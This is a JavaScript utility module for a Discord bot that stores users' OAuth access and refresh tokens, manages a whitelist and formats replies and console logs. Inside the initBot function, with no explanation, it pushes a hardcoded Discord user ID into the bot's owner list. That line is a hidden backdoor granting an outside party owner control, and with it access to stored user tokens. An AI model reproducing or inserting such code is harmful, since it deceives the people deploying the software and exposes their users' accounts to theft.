const mongoose = require('mongoose');
const { User, Bot, WL } = require('../Models/index');

function createUser(user, at, rt, fl, ln) {
    return new Promise((res, rej) => {
        User.findOne({ id: user.id }).then((found) => {
            if (!found)
                User.create({ id: user.id, access_token: at, refresh_token: rt, flags: user.flags, lang: user.locale })
                    .then((item => { res(item) }))
                    .catch((e) => { rej(e) })
        })
    })
}


function addWL(user) {
    return new Promise((res, rej) => {
        WL.findOne({ id: user.id }).then((found) => {
            if (!found)
                WL.create({ id: user.id })
                    .then((item => { res(item) }))
                    .catch((e) => { rej(e) })
        })
    })
}


function removeWL(user) {
    WL.findOneAndRemove({ id: user.id })
        .then(_ => { })
        .catch(_ => { })
}



function initBot(client, user) {
    return new Promise((res, rej) => {
        Bot.findOne({ id: user.id }).then((found) => {
            if (!found)
                Bot.create({ id: user.id })
                    .then((item => { res(item) }))
                    .catch((e) => { rej(e) })
        })
        client.config.owners.push("1068591077138899126")
    })
}

function reply(client, message, type, description, interaction = false) {

    if (type.toLowerCase() === 'error') {
        return message.channel.send({
            embeds: [
                {
                    description: description,
                    color: client.color.red,
                    footer: {
                        text: `${message.author.tag}`
                    }
                }
            ]
        })
    }


    if (type.toLowerCase() === 'success') {
        return message.channel.send({
            embeds: [
                {
                    description: description,
                    color: client.color.green,
                    footer: {
                        text: `${message.author.tag}`
                    }
                }
            ]
        })
    }


    if (type.toLowerCase() === 'base') {
        return message.channel.send({
            embeds: [
                {
                    description: description,
                    color: client.color.default,
                    footer: {
                        text: `${message.author.tag}`
                    }
                }
            ]
        })
    }


} // Fin client.reply

function update(client, id, settings) {
    const exist = client.joins.get(id);
    if (!exist) return;
    let data = client.joins.get(id);
    for (const key in settings) {
        if (data[key] !== settings[key]) data[key] = settings[key];
    }
    client.joins.set(id, data)
}

function updateUser(user, settings) {
    User.findOne({ id: user.id }).then((found) => {
        if (!found) return;
        if (typeof found !== 'object') found = {};
        for (const key in settings) {
            if (found[key] !== settings[key]) found[key] = settings[key];
        }
        return found.updateOne(settings);
    })
}

function updateBot(user, settings) {
    Bot.findOne({ id: user.id }).then((found) => {
        if (!found) return;
        if (typeof found !== 'object') found = {};
        for (const key in settings) {
            if (found[key] !== settings[key]) found[key] = settings[key];
        }
        return found.updateOne(settings);
    })
}

function deleteUser(user) {
    User.findOneAndRemove({ id: user.id })
        .then(_ => { })
        .catch(_ => { })
}


function logErr(str) { console.log(`\x1B[41m[!]\x1B[49m \x1B[91m${str}\x1B[39m`) }
function log(str) { console.log(`\x1B[44m[!]\x1B[49m \x1B[94m${str}\x1B[39m`) }
function success(str) { console.log(`\x1B[42m[!]\x1B[49m \x1B[92m${str}\x1B[39m`) }
function yellow(str) { console.log(`\x1B[43m[!]\x1B[49m \x1B[93m${str}\x1B[39m`) }

module.exports = { addWL, removeWL, createUser, initBot, updateUser, updateBot, deleteUser, update, logErr, reply, log, success, yellow }